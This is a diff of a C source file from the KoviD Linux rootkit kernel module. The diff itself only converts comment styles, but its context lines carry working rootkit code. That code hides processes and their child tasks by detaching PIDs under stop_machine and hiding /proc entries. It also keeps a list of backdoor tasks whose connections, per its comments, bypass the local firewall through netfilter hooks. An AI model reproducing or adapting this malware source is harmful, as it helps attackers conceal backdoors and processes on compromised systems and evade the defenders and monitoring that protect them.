@@ -1,9 +1,5 @@
-/**
- * Linux Kernel version <= 5.8.0
- * - hash
- *
- *  KoviD rootkit
- */
+//  KoviD rootkit
+// - hash
 #include <linux/stop_machine.h>
 #include <linux/version.h>
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 18, 0)
@@ -24,10 +20,8 @@ static int ht_num;
 #endif
 static struct kernel_syscalls *kaddr;
 
-/**
- * Return the task associated
- * with PID number
- */
+// Return the task associated
+// with PID number
 static struct task_struct *_check_hide_by_pid(pid_t pid)
 {
 	struct hidden_tasks *ht, *ht_safe;
@@ -38,9 +32,7 @@ static struct task_struct *_check_hide_by_pid(pid_t pid)
 	return NULL;
 }
 
-/**
- * Copy the task and hide it
- */
+// Copy the task and hide it
 static int _hide_task(void *data)
 {
 	char pidnum[32] = { 0 };
@@ -77,12 +69,12 @@ static int _hide_task(void *data)
 	ht->fnode = fs_get_file_node(node->task);
 	list_add_tail(&ht->list, &tasks_node);
 
-	/** hide /proc/<pid> */
+	// hide /proc/<pid>
 	snprintf(pidnum, sizeof(pidnum), "%d", node->task->pid);
 
 	prinfo("hide [%p] %s : %d\n", ht->task, ht->task->comm, ht->task->pid);
 
-	/** debug */
+	// debug
 #ifdef DEBUG_RING_BUFFER
 	++ht_num;
 #endif
@@ -96,7 +88,7 @@ static void _cleanup_node(struct hidden_tasks **node)
 		return;
 
 	list_del(&(*node)->list);
-	if ((*node)->fnode) /* can be NULL if kernel task */
+	if ((*node)->fnode) // can be NULL when it's kernel task
 		kfree((const void *)(*node)->fnode);
 	kfree((const void *)*node);
 	*node = NULL;
@@ -125,26 +117,22 @@ static int _unhide_task(void *data)
 
 	task = ht->task;
 
-	/**
-     * safe as this is within heavy stop_machine context
-     */
+	// safe as this is within heavy stop_machine context
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
 	kaddr->k_attach_pid(task, PIDTYPE_PID, task_pid(task));
 #else
 	kaddr->k_attach_pid(task, PIDTYPE_PID);
 #endif
 
-	/*
-     * For active backdoors, 'saddr' should match the active outgoing
-     * connection. In sock.c, references for these backdoors are maintained in a list.
-     * This is necessary due to active nf hooks that bypass the local firewall.
-     * This list allows for distinguishing packets that belong to a backdoor.
-     *
-     * If there are netfilter rules blocking the connection, they will be bypassed,
-     * and the connection will proceed as normal. However, when a backdoor task
-     * is being unhidden, the reference to that task needs to be cleaned up
-     * since the task will be terminated shortly.
-     */
+	// For active backdoors, 'saddr' should match the active outgoing
+	// connection. In sock.c, references for these backdoors are maintained in a list.
+	// This is necessary due to active nf hooks that bypass the local firewall.
+	// This list allows for distinguishing packets that belong to a backdoor.
+	//
+	// If there are netfilter rules blocking the connection, they will be bypassed,
+	// and the connection will proceed as normal. However, when a backdoor task
+	// is being unhidden, the reference to that task needs to be cleaned up
+	// since the task will be terminated shortly.
 	if (ht->saddr) {
 		kv_bd_cleanup_item(&ht->saddr);
 	}
@@ -162,24 +150,20 @@ struct to_hide_tasks {
 	struct list_head list;
 };
 
-/**
- * depth-first search tree that looks for children
- */
+// depth-first search tree that looks for children
 static void _select_children(struct task_struct *task)
 {
 	struct list_head *list;
 	struct to_hide_tasks *tht =
 		kcalloc(1, sizeof(struct to_hide_tasks), GFP_KERNEL);
 
-	/*
-     * Here, I begin by obtaining the list of child tasks.
-     * In the _fetch_children_and_hide_tasks() function, I iterate through this list
-     * in reverse order, hiding one task at a time. This method is chosen for safety
-     * reasons, as it's safer than simultaneously listing and hiding tasks.
-     *
-     * It's worth noting that this operation is relatively costly and is exclusively
-     * invoked from the userland interface.
-     */
+	// Here, I begin by obtaining the list of child tasks.
+	// In the _fetch_children_and_hide_tasks() function, I iterate through this list
+	// in reverse order, hiding one task at a time. This method is chosen for safety
+	// reasons, as it's safer than simultaneously listing and hiding tasks.
+	//
+	// It's worth noting that this operation is relatively costly and is exclusively
+	// invoked from the userland interface.
 	if (tht) {
 		tht->task = task;
 		list_add_tail(&tht->list, &children_node);
@@ -268,16 +252,13 @@ static int _reload_hidden_task(void *t)
 		if (!kv_find_hidden_pid(&status, task->pid))
 			goto out;
 
-		/**
-         * this will unhide the task
-         * and make its children visible
-         * */
+		// this will unhide the task
+		// and make its children visible
 		kv_hide_task_by_pid(task->pid, status.saddr,
 				    NO_CHILDREN /** unhide only this task */);
 
-		/**
-         * Now hide the task, side effect is that
-         * children are re-evaluated */
+		// Now hide the task, side effect is that
+		// children are re-evaluated */
 		kv_hide_task_by_pid(task->pid, status.saddr, NO_CHILDREN);
 	}
 	goto out;
@@ -316,7 +297,7 @@ void kv_reload_hidden_task(struct task_struct *task)
 	reload->task = task;
 	reload->msecs = 300;
 
-	/** short lived, no need to hide this kthread */
+	// short lived, no need to hide this kthread
 	(void)kthread_run(_reload_hidden_task, reload, "dontblink");
 }
 
@@ -361,7 +342,7 @@ int kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
 				      ht.task, status);
 				rc = -EINVAL;
 			} else {
-				/** operate within list safe */
+				// operate within list safe
 				_cleanup_node_list(ht.task);
 #ifdef DEBUG_RING_BUFFER
 				--ht_num;
@@ -369,7 +350,7 @@ int kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
 			}
 		}
 	} else if ((task = get_pid_task(find_get_pid(pid), PIDTYPE_PID))) {
-		/* if visible, hide */
+		// visible? hide!
 		_select_children(task);
 		_fetch_children_and_hide_tasks(task, saddr);
 	} else {
@@ -379,14 +360,12 @@ int kv_hide_task_by_pid(pid_t pid, __be32 saddr, Operation op)
 	return rc;
 }
 
-/**
- * Exiting from one BD, exits ALL
- */
+// Exiting from one BD, exits ALL
 void kv_unhide_task_by_pid_exit_group(pid_t pid)
 {
 	struct hidden_tasks *node, *node_safe;
 
-	/** First unhide ALL backdoor tasks */
+	// First unhide ALL backdoor tasks
 	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
 		int status;
 		if (!node->saddr)
@@ -398,7 +377,7 @@ void kv_unhide_task_by_pid_exit_group(pid_t pid)
 		}
 	}
 
-	/** Now cleanup and kill each one of them */
+	// Now cleanup and kill each one of them
 	list_for_each_entry_safe (node, node_safe, &tasks_node, list) {
 		struct task_struct *task;
 		if (!node->saddr)
@@ -414,10 +393,8 @@ void kv_unhide_task_by_pid_exit_group(pid_t pid)
 	}
 }
 
-/**
- * Main cleanup
- * Called during rmmod
- */
+// Main cleanup
+// Called during rmmod
 void kv_pid_cleanup(void)
 {
 	struct hidden_tasks *node, *node_safe;
